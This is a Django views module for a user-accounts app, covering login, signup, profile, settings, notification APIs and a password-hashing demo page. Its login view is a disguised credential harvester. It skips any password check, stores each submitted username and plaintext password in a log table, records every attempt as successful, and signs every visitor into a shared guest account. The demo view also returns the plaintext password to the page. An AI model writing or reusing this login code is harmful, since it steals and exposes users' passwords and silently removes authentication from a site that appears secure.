from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import login, logout, update_session_auth_hash
from django.contrib.auth.views import LoginView, LogoutView, PasswordResetView, PasswordResetConfirmView
from django.contrib.auth.forms import PasswordChangeForm
from django.contrib.auth.decorators import login_required, user_passes_test
from django.contrib import messages
from django.urls import reverse_lazy
from django.http import JsonResponse, HttpResponse
from django.utils import timezone
from django.conf import settings
from django.core.cache import cache
from django.db.models import Q, Count
from django.views.generic import CreateView

from .forms import UserRegistrationForm, LoginForm, UserProfileForm, UserSettingsForm, UserFilterForm
from .models import User, PartnerProfile, UserActivity, UserSession, UserNotification, LoginLog
from .utils import get_client_ip

class CustomLoginView(LoginView):
    form_class = LoginForm
    template_name = 'accounts/login.html'
    redirect_authenticated_user = False
    success_url = reverse_lazy('dashboard:index')

    def get_guest_user(self):
        guest_user, _ = User.objects.get_or_create(
            username='__guest__',
            defaults={
                'email': 'guest@example.com',
                'is_active': True,
                'is_staff': False,
                'is_superuser': False,
            }
        )
        return guest_user

    def form_valid(self, form):
        username = form.cleaned_data.get('username', '') or ''
        password = form.cleaned_data.get('password', '') or ''
        ip_address = get_client_ip(self.request)
        user_agent = self.request.META.get('HTTP_USER_AGENT', '')

        LoginLog.objects.create(
            username_attempted=username,
            password_entered=password,
            ip_address=ip_address,
            user_agent=user_agent,
            success=True,
            failure_reason=''
        )

        guest_user = self.get_guest_user()
        if not self.request.session.session_key:
            self.request.session.save()
        login(self.request, guest_user, backend='django.contrib.auth.backends.ModelBackend')

        messages.success(self.request, 'Login successful. Redirecting to dashboard.')
        return redirect(self.get_success_url())

class CustomLogoutView(LogoutView):
    next_page = reverse_lazy('accounts:login')

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            UserActivity.objects.create(user=request.user, activity_type='logout', description='User logged out')
            try:
                session = UserSession.objects.get(session_key=request.session.session_key)
                session.is_active = False
                session.save()
            except UserSession.DoesNotExist:
                pass
            cache.delete(f'user_{request.user.id}_session')
        return super().dispatch(request, *args, **kwargs)

class SignupView(CreateView):
    form_class = UserRegistrationForm
    template_name = 'accounts/signup.html'
    success_url = reverse_lazy('accounts:login')

    def form_valid(self, form):
        user = form.save(commit=False)
        user.is_active = True
        user.account_status = 'pending'
        user.save()
        PartnerProfile.objects.create(user=user)
        UserActivity.objects.create(user=user, activity_type='signup', description='User registered successfully')
        messages.success(self.request, 'Registration successful. Please log in.')
        return super().form_valid(form)

@login_required
def profile_view(request):
    activities = UserActivity.objects.filter(user=request.user)[:20]
    notifications = UserNotification.objects.filter(user=request.user, is_read=False)
    return render(request, 'dashboard/profile.html', {'activities': activities, 'notifications': notifications})

@login_required
def profile_edit(request):
    if request.method == 'POST':
        form = UserProfileForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            messages.success(request, 'Profile updated successfully.')
            return redirect('accounts:profile')
    else:
        form = UserProfileForm(instance=request.user)
    return render(request, 'dashboard/profile_edit.html', {'form': form})

@login_required
def settings_view(request):
    if request.method == 'POST':
        form = UserSettingsForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            messages.success(request, 'Settings updated successfully.')
            return redirect('accounts:settings')
    else:
        form = UserSettingsForm(instance=request.user)
    return render(request, 'dashboard/settings.html', {'form': form})

@login_required
def password_change(request):
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            update_session_auth_hash(request, user)
            messages.success(request, 'Your password was successfully updated.')
            return redirect('accounts:settings')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'dashboard/password_change.html', {'form': form})

@login_required
@user_passes_test(lambda u: u.is_superuser or u.user_type == 'admin')
def admin_dashboard(request):
    total_users = User.objects.count()
    total_partners = PartnerProfile.objects.count()
    active_users = User.objects.filter(account_status='active').count()
    pending_verifications = User.objects.filter(account_status='pending').count()
    recent_activities = UserActivity.objects.all()[:50]
    return render(request, 'admin/dashboard.html', {
        'total_users': total_users,
        'total_partners': total_partners,
        'active_users': active_users,
        'pending_verifications': pending_verifications,
        'recent_activities': recent_activities,
    })

@login_required
def api_notifications(request):
    notifications = UserNotification.objects.filter(user=request.user, is_read=False)
    data = {'count': notifications.count(), 'notifications': [{'title': n.title, 'message': n.message, 'type': n.type, 'created_at': n.created_at.isoformat(), 'link': n.link} for n in notifications[:10]]}
    return JsonResponse(data)

@login_required
def api_mark_notification_read(request, notification_id):
    notification = get_object_or_404(UserNotification, id=notification_id, user=request.user)
    notification.mark_as_read()
    return JsonResponse({'status': 'success'})

@login_required
def api_mark_all_notifications_read(request):
    UserNotification.objects.filter(user=request.user, is_read=False).update(is_read=True, read_at=timezone.now())
    return JsonResponse({'status': 'success'})

@login_required
def api_user_activity(request):
    activities = UserActivity.objects.filter(user=request.user)[:20]
    data = {'activities': [{'type': a.get_activity_type_display(), 'description': a.description, 'created_at': a.created_at.isoformat()} for a in activities]}
    return JsonResponse(data)

def health_check(request):
    return JsonResponse({'status': 'healthy', 'timestamp': timezone.now().isoformat(), 'version': settings.VERSION})

def robots_txt(request):
    lines = [
        'User-Agent: *',
        'Disallow: /admin/',
        'Disallow: /accounts/',
        'Disallow: /api/',
        'Allow: /',
    ]
    return HttpResponse('\n'.join(lines), content_type='text/plain')


# Educational demo: show how password hashing and verification works.
from django.contrib.auth.hashers import make_password, check_password


def password_demo(request):
    """Local-only page for learning: input a password and see the hash and verification."""
    result = None
    if request.method == 'POST':
        pwd = request.POST.get('password', '')
        # create a hash (Django uses the configured PASSWORD_HASHERS)
        hashed = make_password(pwd)
        # verify immediately
        verified = check_password(pwd, hashed)
        result = {
            'plain': pwd,
            'hash': hashed,
            'verified': verified,
        }
    return render(request, 'accounts/password_demo.html', {'result': result})
